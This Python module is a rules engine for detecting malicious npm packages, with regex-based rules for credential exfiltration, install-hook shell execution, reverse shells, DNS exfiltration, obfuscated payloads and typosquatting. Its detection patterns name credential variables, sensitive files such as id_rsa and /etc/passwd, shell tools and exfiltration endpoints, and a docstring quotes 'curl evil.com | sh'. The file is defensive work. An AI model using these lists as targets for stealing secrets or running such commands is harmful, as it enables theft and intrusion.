"""
Behavioral rules engine for malicious npm package detection.

Analyzes raw package source code (NOT the GNN graph) and returns
a list of matched rules with severity scores. Designed to run
alongside the GNN as a second verification stage.

Execution target: < 500ms per package (< 50 JS files).
"""

from __future__ import annotations

import json
import logging
import math
import os
import re
from collections import Counter
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

log = logging.getLogger(__name__)

# ── Severity weights ──────────────────────────────────────────────────────
SEVERITY_WEIGHTS = {"critical": 10, "high": 5, "medium": 2}

# Per-rule score overrides (when a rule's impact differs from its severity default)
RULE_SCORE_OVERRIDES: dict[str, float] = {
    "CRIT_DYNAMIC_REQUIRE_EXEC": 15,
    "HIGH_ENCODED_PAYLOAD_CHAIN": 8,
    "HIGH_DNS_EXFIL": 8,
    "HIGH_SELF_DELETE": 8,
    "HIGH_RUNTIME_PROTOTYPE_POLLUTION": 7,
    "MED_SUSPICIOUS_PACKAGE_STRUCTURE": 3,
}

# ── Top 50 npm packages for typosquat detection ──────────────────────────
TOP_NPM_PACKAGES = [
    "lodash", "chalk", "request", "commander", "express", "debug", "async",
    "bluebird", "moment", "react", "underscore", "fs-extra", "glob", "mkdirp",
    "minimist", "uuid", "through2", "rimraf", "semver", "yargs", "colors",
    "readable-stream", "graceful-fs", "inherits", "string-decoder", "axios",
    "webpack", "babel-core", "classnames", "prop-types", "jquery", "body-parser",
    "typescript", "tslib", "rxjs", "zone.js", "core-js", "inquirer", "ora",
    "dotenv", "aws-sdk", "ejs", "mongoose", "passport", "socket.io",
    "eslint", "prettier", "nodemon", "jest", "mocha",
]


# ── Data classes ──────────────────────────────────────────────────────────

@dataclass
class MatchedRule:
    rule_id: str
    rule_name: str
    severity: str          # "critical", "high", "medium"
    description: str
    file_path: str = ""
    line_number: int = 0
    matched_code_snippet: str = ""
    score: float = 0.0


@dataclass
class RulesResult:
    matched_rules: list[MatchedRule] = field(default_factory=list)
    total_score: float = 0.0
    has_critical: bool = False

    def summary(self) -> str:
        names = ", ".join(r.rule_id for r in self.matched_rules)
        return (f"score={self.total_score:.0f}  "
                f"rules={len(self.matched_rules)}  "
                f"critical={self.has_critical}  [{names}]")


# ── Regex patterns ────────────────────────────────────────────────────────

# Only match SPECIFIC credential variable names — not DATABASE_URL or generic patterns
# that legitimate server packages use.
_CRED_ENV_VARS = re.compile(
    r"process\.env\s*[\[.]\s*['\"]?"
    r"(AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID|GITHUB_TOKEN|NPM_TOKEN"
    r"|SSH_KEY|SSH_PRIVATE_KEY|GH_TOKEN|GITLAB_TOKEN|NPM_AUTH_TOKEN"
    r"|HEROKU_API_KEY|SLACK_TOKEN|DISCORD_TOKEN)",
)

_NETWORK_SEND = re.compile(
    r"(https?\.request|https?\.get|https?\.post|"
    r"fetch\s*\(|axios\.|XMLHttpRequest|net\.Socket|"
    r"node-fetch|got\s*\(|superagent|\.request\s*\()",
    re.IGNORECASE,
)

_SENSITIVE_FILES = re.compile(
    r"(/etc/passwd|/etc/shadow|~/\.ssh|\.ssh/|id_rsa|"
    r"\.aws/credentials|~/\.npmrc|\.npmrc|"
    r"\.bash_history|\.gitconfig|\.gnupg)",
)

_FILE_READ = re.compile(
    r"(readFileSync|readFile\s*\(|createReadStream|readdirSync|readdir\s*\()",
    re.IGNORECASE,
)

_CHILD_PROC = re.compile(
    r"(child_process|\.exec\s*\(|\.execSync\s*\(|\.spawn\s*\(|\.spawnSync\s*\()",
)

_SHELL_CMD = re.compile(
    r"(curl |wget |powershell|bash |/bin/sh|/bin/bash|cmd\s*/c|"
    r"\|\s*(?:sh|bash)\b)",
    re.IGNORECASE,
)

_NODE_E_LOADER = re.compile(
    r"node\s+-[ep]\b(?=.*(?:Buffer\.from|atob|eval|Function|http|https|curl|wget|base64))",
    re.IGNORECASE,
)

_DNS_EXFIL = re.compile(
    r"(dns\.lookup|dns\.resolve|dgram\.createSocket|dgram\.Socket)",
)

# Scope to ~2000 char windows instead of DOTALL across entire file.
# This prevents matching unrelated net.Socket and child_process in
# different parts of a large file.
_REVERSE_SHELL_SOCKET = re.compile(r"(net\.Socket|net\.createConnection|net\.connect|new\s+Socket|dgram\.createSocket|\bnet\b)")
_REVERSE_SHELL_SHELL = re.compile(r"(child_process|/bin/sh|/bin/bash|cmd\.exe|powershell|\bspawn\b)")
_REVERSE_SHELL_PIPE = re.compile(r"\.pipe\s*\(")

_HEX_ESCAPE = re.compile(r"\\x[0-9a-fA-F]{2}")
_UNICODE_ESCAPE = re.compile(r"\\u[0-9a-fA-F]{4}")
_FROM_CHAR_CODE = re.compile(r"String\.fromCharCode", re.IGNORECASE)
_BASE64_LONG = re.compile(r"['\"`]([A-Za-z0-9+/=]{100,})['\"`]")

_EVAL_PATTERN = re.compile(
    r"(\beval\s*\(|\bFunction\s*\(|new\s+Function|vm\.runInNewContext)",
)

_BASE64_DECODE = re.compile(
    r"(Buffer\.from\s*\([^)]*['\"]base64['\"]|atob\s*\(|"
    r"from\s*\([^)]*,\s*['\"]base64['\"])",
)

# Only match explicit bulk collection — NOT bare `process.env` references
# which appear in many legitimate packages (dotenv, config loaders).
_PROCESS_ENV_BULK = re.compile(
    r"(Object\.keys\s*\(\s*process\.env\s*\)|"
    r"Object\.entries\s*\(\s*process\.env\s*\)|"
    r"JSON\.stringify\s*\(\s*process\.env\s*\)|"
    r"\{\s*\.\.\.process\.env\s*\})",
)

_WEBHOOK_URLS = re.compile(
    r"(webhook\.site|requestbin\.com|pipedream\.com|hookbin\.com|"
    r"burpcollaborator\.net|interact\.sh|oastify\.com|ngrok\.io|"
    r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})",
    re.IGNORECASE,
)

_LOCAL_REQUIRE = re.compile(r"require\s*\(\s*['\"](\./[^'\"]+)['\"]\s*\)")
_LOCALHOST = re.compile(r"(localhost|127\.0\.0\.1|0\.0\.0\.0|registry\.npmjs\.org|npmjs\.org)")

# ── New patterns for Phase 4 rules ────────────────────────────────────────

_DYNAMIC_REQUIRE = re.compile(
    r"\brequire\s*\("
    r"(?!\s*['\"])"     # NOT followed by a simple string literal
)

_DYNAMIC_REQUIRE_EXEC_SINK = re.compile(
    r"(\beval\s*\(|\bFunction\s*\(|\brequire\s*\()",
)

_ENCODED_PAYLOAD_BASE64 = re.compile(
    r"['\"`]([A-Za-z0-9+/=]{40,})['\"`]"
)

_ENCODED_PAYLOAD_HEX = re.compile(
    r"(?:\\x[0-9a-fA-F]{2}){10,}"
)

_DECODE_FUNCS = re.compile(
    r"\b(?:Buffer\.from|atob|decodeURIComponent|String\.fromCharCode)\s*\("
)

_EXEC_SINK = re.compile(
    r"(?:\beval\s*\(|\bFunction\s*\(|\brequire\s*\(|"
    r"https?\.\s*(?:get|post|request)\s*\(|\bfetch\s*\(|\baxios\b)"
)

_DNS_USAGE = re.compile(
    r"\b(?:dns\.lookup|dns\.resolve[A-Za-z]*|dgram\.createSocket|dgram)\b"
)

_EXFIL_DATA_SOURCE = re.compile(
    r"(?:process\.env|os\.hostname|os\.userInfo|os\.platform|"
    r"readFileSync|readFile\s*\()"
)

_PROTO_POLLUTION = re.compile(
    r"(?:__proto__|constructor\s*\.\s*prototype|"
    r"Object\.defineProperty\s*\([^)]*prototype)"
)

_MODULE_EXPORTS = re.compile(
    r"module\.exports"
)

_SELF_DELETE = re.compile(
    r"(?:fs\.)?(?:unlinkSync|unlink|rmSync|rm)\s*\(\s*(?:__filename|process\.argv\s*\[\s*1\s*\])",
    re.IGNORECASE,
)


# ── Helpers ───────────────────────────────────────────────────────────────

def _snippet(text: str, match: re.Match, max_len: int = 200) -> str:
    start = max(0, match.start() - 30)
    end = min(len(text), match.end() + 30)
    s = text[start:end].replace("\n", "\\n")
    return s[:max_len]


def _find_line(text: str, pos: int) -> int:
    return text[:pos].count("\n") + 1


def _shannon_entropy(s: str) -> float:
    if len(s) < 2:
        return 0.0
    counts = Counter(s)
    length = len(s)
    return -sum((c / length) * math.log2(c / length) for c in counts.values())


def _edit_distance(a: str, b: str) -> int:
    if abs(len(a) - len(b)) > 2:
        return 3
    m, n = len(a), len(b)
    dp = list(range(n + 1))
    for i in range(1, m + 1):
        prev, dp[0] = dp[0], i
        for j in range(1, n + 1):
            temp = dp[j]
            dp[j] = prev if a[i-1] == b[j-1] else 1 + min(prev, dp[j], dp[j-1])
            prev = temp
    return dp[n]


def _load_js_sources(pkg_dir: Path) -> dict[str, str]:
    """Load all JS file contents, keyed by relative path."""
    # Limit traversal to source-like files so vendored packages do not dominate a scan.
    sources: dict[str, str] = {}
    for js_file in sorted(pkg_dir.rglob("*.js")):
        rel = js_file.relative_to(pkg_dir)
        if any(p in rel.parts for p in ("node_modules", ".git", "vendor")):
            continue
        try:
            sources[str(rel)] = js_file.read_text(encoding="utf-8", errors="replace")
        except (PermissionError, OSError):
            continue
    return sources


def _resolve_local_requires(source: str, base_dir: Path) -> list[Path]:
    """Resolve require('./path') to local file paths."""
    paths = []
    for m in _LOCAL_REQUIRE.finditer(source):
        req = m.group(1)
        candidate = base_dir / req
        for ext in ("", ".js", "/index.js"):
            p = Path(str(candidate) + ext)
            if p.exists() and p.is_file():
                paths.append(p)
                break
    return paths


def _get_hook_entry(pkg_json: dict, pkg_dir: Path) -> tuple[str | None, str | None, list[str]]:
    """Return (hook_name, hook_cmd, reachable_source_codes)."""
    scripts = pkg_json.get("scripts", {})
    for hook in ("preinstall", "postinstall", "preuninstall"):
        cmd = scripts.get(hook)
        if not cmd:
            continue
        # Parse "node index.js" or "node ./lib/setup.js"
        parts = cmd.split()
        entry_file = None
        for p in parts:
            if p.endswith(".js"):
                entry_file = p
                break

        sources = []
        if entry_file:
            entry_path = pkg_dir / entry_file
            if entry_path.exists():
                try:
                    code = entry_path.read_text(encoding="utf-8", errors="replace")
                    sources.append(code)
                    # Follow one level of local requires
                    for req_path in _resolve_local_requires(code, entry_path.parent):
                        try:
                            sources.append(req_path.read_text(encoding="utf-8", errors="replace"))
                        except (PermissionError, OSError):
                            pass
                except (PermissionError, OSError):
                    pass

        return hook, cmd, sources
    return None, None, []


# ── CRITICAL rules ────────────────────────────────────────────────────────
# These represent behaviors that benign packages essentially never exhibit.

def _rule_crit_exfil_credentials(sources: dict[str, str]) -> Optional[MatchedRule]:
    """CRIT: Reads 2+ specific credential env vars AND sends data over network.

    False-positive analysis: Benign server packages may read ONE credential
    (e.g. DATABASE_URL for a DB driver). We require 2+ distinct credential
    variable names to avoid false positives on legitimate config access.
    We also use a strict list of credential names (no wildcards like *SECRET*).
    """
    # Credential access is only critical when it is paired with an outbound path.
    for fpath, code in sources.items():
        creds = _CRED_ENV_VARS.findall(code)
        net = _NETWORK_SEND.search(code)
        # Require 2+ distinct credential vars AND network access
        if len(set(creds)) >= 2 and net:
            return MatchedRule(
                rule_id="CRIT_EXFIL_CREDENTIALS",
                rule_name="Credential Exfiltration",
                severity="critical",
                description=f"Reads {len(set(creds))} credential vars and sends over network: {set(creds)}",
                file_path=fpath,
                line_number=_find_line(code, net.start()),
                matched_code_snippet=_snippet(code, net),
            )
    return None


def _rule_crit_exfil_files(sources: dict[str, str]) -> Optional[MatchedRule]:
    """CRIT: Reads sensitive file paths AND sends data over network.

    False-positive analysis: No legitimate npm package reads /etc/passwd or ~/.ssh/id_rsa.
    """
    for fpath, code in sources.items():
        sens = _SENSITIVE_FILES.search(code)
        net = _NETWORK_SEND.search(code)
        if sens and net:
            return MatchedRule(
                rule_id="CRIT_EXFIL_FILES",
                rule_name="Sensitive File Exfiltration",
                severity="critical",
                description="Reads sensitive files and sends data over network",
                file_path=fpath,
                line_number=_find_line(code, sens.start()),
                matched_code_snippet=_snippet(code, sens),
            )
    return None


def _rule_crit_install_hook_exec(
    pkg_json: dict, pkg_dir: Path
) -> Optional[MatchedRule]:
    """CRIT: Install hook script calls shell exec with curl/wget/bash.

    False-positive analysis: Legitimate postinstall scripts run things like
    'node setup.js' or 'npx husky install', not 'curl evil.com | sh'.
    """
    hook, cmd, hook_sources = _get_hook_entry(pkg_json, pkg_dir)
    if not hook:
        return None

    # Check the hook command itself
    if _SHELL_CMD.search(cmd or "") or _NODE_E_LOADER.search(cmd or ""):
        return MatchedRule(
            rule_id="CRIT_INSTALL_HOOK_EXEC",
            rule_name="Install Hook Shell Execution",
            severity="critical",
            description=f"{hook} script runs shell command: {cmd}",
            matched_code_snippet=cmd[:200],
        )

    # Check files reached by the hook
    for code in hook_sources:
        cp = _CHILD_PROC.search(code)
        sh = _SHELL_CMD.search(code)
        if cp and sh:
            return MatchedRule(
                rule_id="CRIT_INSTALL_HOOK_EXEC",
                rule_name="Install Hook Shell Execution",
                severity="critical",
                description=f"{hook} script reaches child_process + shell command",
                matched_code_snippet=_snippet(code, cp),
            )
    return None


def _rule_crit_install_hook_network(
    pkg_json: dict, pkg_dir: Path
) -> Optional[MatchedRule]:
    """CRIT: Install hook makes network request to external domain.

    False-positive analysis: Some packages phone home on install (telemetry),
    but those typically go to well-known domains. This flags non-localhost,
    non-npmjs.org requests.
    """
    hook, cmd, hook_sources = _get_hook_entry(pkg_json, pkg_dir)
    if not hook:
        return None

    for code in hook_sources:
        net = _NETWORK_SEND.search(code)
        if net and not _LOCALHOST.search(code):
            return MatchedRule(
                rule_id="CRIT_INSTALL_HOOK_NETWORK",
                rule_name="Install Hook Network Access",
                severity="critical",
                description=f"{hook} script makes external network request",
                matched_code_snippet=_snippet(code, net),
            )
    return None


def _rule_crit_dns_exfil(sources: dict[str, str]) -> Optional[MatchedRule]:
    """CRIT: Uses DNS to exfiltrate data (dns.resolve, dgram).

    False-positive analysis: Normal packages don't use dns.resolve or dgram
    to send data. DNS libraries exist but are rare in the npm ecosystem.
    """
    for fpath, code in sources.items():
        m = _DNS_EXFIL.search(code)
        if m and _CRED_ENV_VARS.search(code):
            return MatchedRule(
                rule_id="CRIT_DNS_EXFIL",
                rule_name="DNS Data Exfiltration",
                severity="critical",
                description="Uses DNS to exfiltrate credentials",
                file_path=fpath,
                line_number=_find_line(code, m.start()),
                matched_code_snippet=_snippet(code, m),
            )
    return None


def _rule_crit_reverse_shell(sources: dict[str, str]) -> Optional[MatchedRule]:
    """CRIT: Opens a socket connected to a shell process in the same file.

    Requires BOTH of these in the SAME FILE:
        - A network socket pattern
        - A shell execution pattern

    AND BOTH proximity/connection signals:
        - Socket and shell references within 30 lines of each other
        - File contains .pipe( OR stream redirection
    """
    for fpath, code in sources.items():
        sock_matches = list(_REVERSE_SHELL_SOCKET.finditer(code))
        shell_matches = list(_REVERSE_SHELL_SHELL.finditer(code))
        if not sock_matches or not shell_matches:
            continue

        # Both patterns exist in this file — check proximity signals
        has_pipe = _REVERSE_SHELL_PIPE.search(code) is not None
        has_stream_redir = (
            ("stdin" in code) and ("stdout" in code or "stderr" in code)
        )

        # Check if any socket and shell reference are within 30 lines
        lines = code.split("\n")
        sock_lines = set()
        shell_lines = set()
        for sm in sock_matches:
            sock_lines.add(_find_line(code, sm.start()))
        for shm in shell_matches:
            shell_lines.add(_find_line(code, shm.start()))

        within_30 = False
        for sl in sock_lines:
            for shl in shell_lines:
                if abs(sl - shl) <= 30:
                    within_30 = True
                    break
            if within_30:
                break

        if within_30 and (has_pipe or has_stream_redir):
            first_sock = sock_matches[0]
            return MatchedRule(
                rule_id="CRIT_REVERSE_SHELL",
                rule_name="Reverse Shell",
                severity="critical",
                description=(
                    f"Socket + shell in same file "
                    f"(proximity={within_30}, pipe={has_pipe}, "
                    f"stream_redir={has_stream_redir})"
                ),
                file_path=fpath,
                line_number=_find_line(code, first_sock.start()),
                matched_code_snippet=_snippet(code, first_sock),
            )
    return None


# ── HIGH rules ────────────────────────────────────────────────────────────

def _rule_high_obfuscated_install(
    pkg_json: dict, pkg_dir: Path
) -> Optional[MatchedRule]:
    """HIGH: Install hook file contains obfuscated code.

    False-positive analysis: Minified code may have some hex escapes, but
    legitimate build outputs don't use String.fromCharCode chains or
    decode+eval patterns in install scripts.
    """
    hook, cmd, hook_sources = _get_hook_entry(pkg_json, pkg_dir)
    if not hook:
        return None

    for code in hook_sources:
        hex_count = len(_HEX_ESCAPE.findall(code))
        uni_count = len(_UNICODE_ESCAPE.findall(code))
        fcc = _FROM_CHAR_CODE.search(code)
        b64 = _BASE64_LONG.search(code)

        if hex_count >= 5 or uni_count >= 5 or fcc or b64:
            return MatchedRule(
                rule_id="HIGH_OBFUSCATED_INSTALL",
                rule_name="Obfuscated Install Script",
                severity="high",
                description=f"Install hook contains obfuscated code "
                            f"(hex={hex_count}, unicode={uni_count})",
            )
    return None


def _rule_high_eval_decoded(sources: dict[str, str]) -> Optional[MatchedRule]:
    """HIGH: Decodes base64/hex AND passes result to eval/Function.

    False-positive analysis: Some code generators use eval, but they don't
    base64-decode strings first. The decode→eval pattern is malware-specific.
    """
    for fpath, code in sources.items():
        decode = _BASE64_DECODE.search(code)
        ev = _EVAL_PATTERN.search(code)
        if decode and ev:
            return MatchedRule(
                rule_id="HIGH_EVAL_DECODED",
                rule_name="Eval of Decoded Content",
                severity="high",
                description="Decodes base64/hex content then evaluates it",
                file_path=fpath,
                line_number=_find_line(code, ev.start()),
                matched_code_snippet=_snippet(code, ev),
            )
    return None


def _rule_high_process_env_bulk(sources: dict[str, str]) -> Optional[MatchedRule]:
    """HIGH: Accesses ALL env vars (not specific ones).

    False-positive analysis: Dotenv and similar read process.env, but they
    access specific keys. Bulk access (Object.keys(process.env)) is suspicious.
    """
    for fpath, code in sources.items():
        m = _PROCESS_ENV_BULK.search(code)
        if m:
            return MatchedRule(
                rule_id="HIGH_PROCESS_ENV_BULK",
                rule_name="Bulk Environment Harvesting",
                severity="high",
                description="Accesses all environment variables",
                file_path=fpath,
                line_number=_find_line(code, m.start()),
                matched_code_snippet=_snippet(code, m),
            )
    return None


def _rule_high_typosquat(pkg_json: dict) -> Optional[MatchedRule]:
    """HIGH: Package name is within edit distance 1-2 of a top npm package.

    False-positive analysis: Some scoped packages legitimately contain
    popular names (@company/lodash-utils). We only flag unscoped names.
    """
    name = pkg_json.get("name", "")
    if not name or name.startswith("@"):
        return None
    for top in TOP_NPM_PACKAGES:
        if name == top:
            continue
        d = _edit_distance(name, top)
        if 0 < d <= 2:
            return MatchedRule(
                rule_id="HIGH_TYPOSQUAT_SIGNAL",
                rule_name="Typosquat Name",
                severity="high",
                description=f"Name '{name}' is {d} edit(s) from popular package '{top}'",
            )
    return None


def _rule_high_webhook_exfil(sources: dict[str, str]) -> Optional[MatchedRule]:
    """HIGH: Sends data to known exfiltration endpoints.

    False-positive analysis: Legitimate packages don't send data to
    webhook.site or interact.sh. These are exclusively testing/exfil services.
    """
    for fpath, code in sources.items():
        m = _WEBHOOK_URLS.search(code)
        net = _NETWORK_SEND.search(code)
        if m and net:
            return MatchedRule(
                rule_id="HIGH_WEBHOOK_EXFIL",
                rule_name="Webhook Exfiltration",
                severity="high",
                description="Sends data to known exfiltration endpoint",
                file_path=fpath,
                line_number=_find_line(code, m.start()),
                matched_code_snippet=_snippet(code, m),
            )
    return None


def _rule_high_stego_payload(sources: dict[str, str]) -> Optional[MatchedRule]:
    """HIGH: Contains high-entropy long string that gets decoded at runtime.

    False-positive analysis: Minified bundles have long strings but low entropy.
    Encrypted/compressed payloads have entropy > 4.5 bits/char and are decoded.
    """
    for fpath, code in sources.items():
        for m in _BASE64_LONG.finditer(code):
            payload = m.group(1)
            if len(payload) >= 500:
                ent = _shannon_entropy(payload)
                if ent > 4.5:
                    return MatchedRule(
                        rule_id="HIGH_STEGANOGRAPHIC_PAYLOAD",
                        rule_name="Hidden Payload",
                        severity="high",
                        description=f"High-entropy string ({ent:.1f} bits/char, "
                                    f"{len(payload)} chars)",
                        file_path=fpath,
                        line_number=_find_line(code, m.start()),
                        matched_code_snippet=payload[:200],
                    )
    return None


# ── MEDIUM rules ──────────────────────────────────────────────────────────

def _rule_med_install_hook(pkg_json: dict) -> Optional[MatchedRule]:
    """MED: Package has any preinstall/postinstall script.

    False-positive analysis: Many benign packages have install hooks (e.g.
    node-gyp, husky). This is a risk signal, not a blocker alone.
    """
    scripts = pkg_json.get("scripts", {})
    for hook in ("preinstall", "postinstall"):
        if hook in scripts:
            return MatchedRule(
                rule_id="MED_INSTALL_HOOK_EXISTS",
                rule_name="Install Hook Present",
                severity="medium",
                description=f"{hook}: {scripts[hook][:100]}",
            )
    return None


def _rule_med_network_plus_fs(sources: dict[str, str]) -> Optional[MatchedRule]:
    """MED: Package both reads files and makes network requests.

    False-positive analysis: Build tools, bundlers, and upload utilities
    legitimately do this. Hence medium severity.
    """
    has_read = any(_FILE_READ.search(c) for c in sources.values())
    has_net = any(_NETWORK_SEND.search(c) for c in sources.values())
    if has_read and has_net:
        return MatchedRule(
            rule_id="MED_NETWORK_PLUS_FS",
            rule_name="Network + File System Access",
            severity="medium",
            description="Reads files and makes network requests",
        )
    return None


def _rule_med_eval_usage(
    pkg_json: dict, pkg_dir: Path
) -> Optional[MatchedRule]:
    """MED: Uses eval() or Function() in install hook files only.

    False-positive analysis: Many benign packages use eval (template engines,
    test tools, bundlers). Restricting to install hook files eliminates the
    noise — eval in a postinstall script is much more suspicious than eval
    in a library file.
    """
    hook, cmd, hook_sources = _get_hook_entry(pkg_json, pkg_dir)
    if not hook:
        return None
    for code in hook_sources:
        ev = _EVAL_PATTERN.search(code)
        decode = _BASE64_DECODE.search(code)
        if ev and not decode:
            return MatchedRule(
                rule_id="MED_EVAL_USAGE",
                rule_name="Dynamic Code Execution in Install Hook",
                severity="medium",
                description=f"Uses eval() or Function() in {hook} hook file",
            )
    return None


def _rule_med_minified_single(sources: dict[str, str]) -> Optional[MatchedRule]:
    """MED: Single minified JS file (short line count, large size).

    False-positive analysis: Bundled libraries are often minified, but
    shipping only a single minified file is unusual for packages with
    install hooks.
    """
    if len(sources) != 1:
        return None
    fpath, code = next(iter(sources.items()))
    lines = code.count("\n") + 1
    size = len(code.encode("utf-8", errors="replace"))
    if lines < 5 and size > 10_000:
        return MatchedRule(
            rule_id="MED_MINIFIED_SINGLE_FILE",
            rule_name="Minified Single File",
            severity="medium",
            description=f"Single JS file, {lines} lines, {size:,} bytes",
            file_path=fpath,
        )
    avg_line = size / max(lines, 1)
    if avg_line > 200 and lines < 20:
        return MatchedRule(
            rule_id="MED_MINIFIED_SINGLE_FILE",
            rule_name="Minified Single File",
            severity="medium",
            description=f"Avg line length {avg_line:.0f} chars",
            file_path=fpath,
        )
    return None


# ── NEW rules (Phase 4) ───────────────────────────────────────────────

def _rule_crit_dynamic_require_exec(sources: dict[str, str]) -> Optional[MatchedRule]:
    """CRIT: Dynamic require() where the argument is computed, AND the result
    flows into eval/Function or is called directly.

    Catches patterns like: ``const m = require(decode("aHR0cA==")); m.get(url)``
    """
    for fpath, code in sources.items():
        dyn = _DYNAMIC_REQUIRE.search(code)
        if not dyn:
            continue
        sink = _DYNAMIC_REQUIRE_EXEC_SINK.search(code)
        decode = _DECODE_FUNCS.search(code)
        if sink and decode:
            return MatchedRule(
                rule_id="CRIT_DYNAMIC_REQUIRE_EXEC",
                rule_name="Dynamic Require with Execution",
                severity="critical",
                description="Computed require() argument with decode function flowing to exec sink",
                file_path=fpath,
                line_number=_find_line(code, dyn.start()),
                matched_code_snippet=_snippet(code, dyn),
            )
    return None


def _rule_high_encoded_payload_chain(sources: dict[str, str]) -> Optional[MatchedRule]:
    """HIGH: Within a 20-line window, detects:
    1. A long base64/hex encoded string
    2. A decoding function call
    3. The result flowing into eval/Function/require/network call

    All three must co-occur within proximity.
    """
    for fpath, code in sources.items():
        lines = code.split("\n")
        for i, line in enumerate(lines):
            window = "\n".join(lines[max(0, i - 10):i + 10])

            has_payload = (
                _ENCODED_PAYLOAD_BASE64.search(window)
                or _ENCODED_PAYLOAD_HEX.search(window)
            )
            has_decode = _DECODE_FUNCS.search(window)
            has_sink = _EXEC_SINK.search(window)

            if has_payload and has_decode and has_sink:
                return MatchedRule(
                    rule_id="HIGH_ENCODED_PAYLOAD_CHAIN",
                    rule_name="Encoded Payload Decode-Execute Chain",
                    severity="high",
                    description="Encoded payload + decode function + execution sink within 20-line window",
                    file_path=fpath,
                    line_number=i + 1,
                    matched_code_snippet=window[:200],
                )
    return None


def _rule_high_dns_exfil(sources: dict[str, str]) -> Optional[MatchedRule]:
    """HIGH: DNS-based data exfiltration — dns.lookup/resolve or dgram combined
    with string concatenation that includes process.env, os.hostname, or file reads.
    """
    for fpath, code in sources.items():
        dns_match = _DNS_USAGE.search(code)
        exfil_src = _EXFIL_DATA_SOURCE.search(code)
        if dns_match and exfil_src:
            return MatchedRule(
                rule_id="HIGH_DNS_EXFIL",
                rule_name="DNS Data Exfiltration",
                severity="high",
                description="DNS operations combined with sensitive data access (env/hostname/files)",
                file_path=fpath,
                line_number=_find_line(code, dns_match.start()),
                matched_code_snippet=_snippet(code, dns_match),
            )
    return None


def _rule_med_suspicious_package_structure(
    pkg_json: dict, pkg_dir: Path, sources: dict[str, str],
) -> Optional[MatchedRule]:
    """MED: Package has all hallmarks of a throwaway malware package:
    - Only 1-2 JS files
    - Total code < 50 lines
    - Has a preinstall or postinstall hook
    - No test directory, no README longer than 100 chars
    """
    scripts = pkg_json.get("scripts", {})
    has_hook = "preinstall" in scripts or "postinstall" in scripts or "install" in scripts
    if not has_hook:
        return None

    if len(sources) > 2 or len(sources) == 0:
        return None

    total_lines = sum(c.count("\n") + 1 for c in sources.values())
    if total_lines >= 50:
        return None

    test_dir = pkg_dir / "test"
    tests_dir = pkg_dir / "tests"
    has_tests = test_dir.is_dir() or tests_dir.is_dir()
    if has_tests:
        return None

    readme = None
    for name in ("README.md", "readme.md", "README", "README.txt"):
        p = pkg_dir / name
        if p.exists():
            try:
                readme = p.read_text(encoding="utf-8", errors="replace")
            except OSError:
                pass
            break
    if readme and len(readme) > 100:
        return None

    return MatchedRule(
        rule_id="MED_SUSPICIOUS_PACKAGE_STRUCTURE",
        rule_name="Suspicious Minimal Package Structure",
        severity="medium",
        description=(
            f"Only {len(sources)} JS file(s), {total_lines} lines, "
            f"has install hook, no tests, short/missing README"
        ),
    )


def _rule_high_self_delete(sources: dict[str, str]) -> Optional[MatchedRule]:
    """HIGH: Script deletes its own file after execution."""
    for fpath, code in sources.items():
        m = _SELF_DELETE.search(code)
        if m:
            return MatchedRule(
                rule_id="HIGH_SELF_DELETE",
                rule_name="Self-Deleting Script",
                severity="high",
                description="Deletes the currently executing script",
                file_path=fpath,
                line_number=_find_line(code, m.start()),
                matched_code_snippet=_snippet(code, m),
            )
    return None


def _rule_high_prototype_pollution(sources: dict[str, str]) -> Optional[MatchedRule]:
    """HIGH: Prototype pollution via __proto__, constructor.prototype, or
    Object.defineProperty on a prototype chain, combined with module.exports.
    """
    for fpath, code in sources.items():
        proto = _PROTO_POLLUTION.search(code)
        exports = _MODULE_EXPORTS.search(code)
        if proto and exports:
            return MatchedRule(
                rule_id="HIGH_RUNTIME_PROTOTYPE_POLLUTION",
                rule_name="Runtime Prototype Pollution",
                severity="high",
                description="Prototype chain manipulation with exported module",
                file_path=fpath,
                line_number=_find_line(code, proto.start()),
                matched_code_snippet=_snippet(code, proto),
            )
    return None


# ── Public API ────────────────────────────────────────────────────────────

def run_rules(package_dir: str) -> RulesResult:
    """Run all behavioral rules on a package directory.

    Parameters
    ----------
    package_dir : str
        Path to the extracted npm package (must contain package.json).

    Returns
    -------
    RulesResult with matched rules, total score, and critical flag.
    """
    # Rules are independent from the GNN so they remain useful in fallback mode.
    pkg_dir = Path(package_dir)
    result = RulesResult()

    # Load package.json
    pkg_json: dict = {}
    pj_path = pkg_dir / "package.json"
    if pj_path.exists():
        try:
            pkg_json = json.loads(pj_path.read_text(encoding="utf-8"))
        except (json.JSONDecodeError, UnicodeDecodeError):
            log.warning("Failed to parse package.json in %s", pkg_dir)

    # Load JS sources
    sources = _load_js_sources(pkg_dir)
    log.debug("Loaded %d JS files from %s", len(sources), pkg_dir)

    # Run all rules
    checks = [
        # CRITICAL
        lambda: _rule_crit_exfil_credentials(sources),
        lambda: _rule_crit_exfil_files(sources),
        lambda: _rule_crit_install_hook_exec(pkg_json, pkg_dir),
        lambda: _rule_crit_install_hook_network(pkg_json, pkg_dir),
        lambda: _rule_crit_dns_exfil(sources),
        lambda: _rule_crit_reverse_shell(sources),
        lambda: _rule_crit_dynamic_require_exec(sources),
        # HIGH
        lambda: _rule_high_obfuscated_install(pkg_json, pkg_dir),
        lambda: _rule_high_eval_decoded(sources),
        lambda: _rule_high_process_env_bulk(sources),
        lambda: _rule_high_typosquat(pkg_json),
        lambda: _rule_high_webhook_exfil(sources),
        lambda: _rule_high_stego_payload(sources),
        lambda: _rule_high_encoded_payload_chain(sources),
        lambda: _rule_high_dns_exfil(sources),
        lambda: _rule_high_self_delete(sources),
        lambda: _rule_high_prototype_pollution(sources),
        # MEDIUM
        lambda: _rule_med_install_hook(pkg_json),
        lambda: _rule_med_network_plus_fs(sources),
        lambda: _rule_med_eval_usage(pkg_json, pkg_dir),
        lambda: _rule_med_minified_single(sources),
        lambda: _rule_med_suspicious_package_structure(pkg_json, pkg_dir, sources),
    ]

    for check in checks:
        try:
            matched = check()
            if matched is not None:
                result.matched_rules.append(matched)
        except Exception as e:
            log.debug("Rule check failed: %s", e)

    # Compute total score and critical flag
    for rule in result.matched_rules:
        score = rule.score or RULE_SCORE_OVERRIDES.get(
            rule.rule_id, SEVERITY_WEIGHTS.get(rule.severity, 0),
        )
        rule.score = score
        result.total_score += score
        if rule.severity == "critical":
            result.has_critical = True

    log.debug("Rules result for %s: %s", pkg_dir.name, result.summary())
    return result
